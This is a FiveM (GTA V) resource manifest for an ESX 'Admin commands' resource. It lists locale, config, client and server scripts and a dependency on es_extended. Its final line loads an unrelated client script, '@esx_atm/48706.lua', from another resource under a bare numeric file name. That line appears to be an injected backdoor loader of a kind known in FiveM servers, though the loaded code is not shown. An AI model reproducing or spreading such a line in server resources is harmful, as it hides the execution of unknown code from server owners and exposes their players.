fx_version 'bodacious'
game 'gta5'
author 'Ali Exacute'
description 'Admin commands'
version '1.0.0'

shared_scripts {
	'@es_extended/locale.lua',
	'locales/es.lua',
    'config.lua'
}
client_script 'client.lua'
server_scripts {
	'@async/async.lua',
	'@mysql-async/lib/MySQL.lua',
	'config.lua',
	'server.lua'
}

dependency "es_extended"

client_script '@esx_atm/48706.lua'